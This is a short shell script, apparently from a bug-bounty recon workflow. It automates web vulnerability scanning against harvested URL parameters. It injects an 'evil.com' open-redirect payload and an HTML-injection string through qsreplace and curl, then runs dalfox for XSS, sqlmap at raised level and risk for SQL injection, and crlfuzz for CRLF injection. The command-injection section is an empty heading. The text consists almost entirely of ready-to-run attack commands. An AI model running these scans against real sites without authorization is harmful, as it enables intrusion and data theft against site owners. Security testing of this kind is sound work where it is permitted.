#Open Redirect : 
cat $url/recon/final_params.txt | qsreplace 'https://evil.com' | while read host do ; do curl -s -L $host -I | grep "https://evil.com" && echo "$host" ;done >> $url/open_redirect.txt
#HTML Injection :
cat $url/recon/final_params.txt | qsreplace '"><u>hyper</u>' | tee $url/recon/temp.txt && cat $url/recon/temp.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<u>hyper</u>" && echo "$host"; done > $url/htmli.txt
#XSS :
dalfox file $url/htmli.txt -o  $url/rxss.txt
#Sql Injection :
cat $url/htmli.txt | python3 /opt/sqlmap/sqlmap.py --level 2 --risk 2
#CRLF Injection :
crlfuzz -l $url/recon/final_params.txt -o $url/crlf-vuln.txt -s 
#Command Injection :

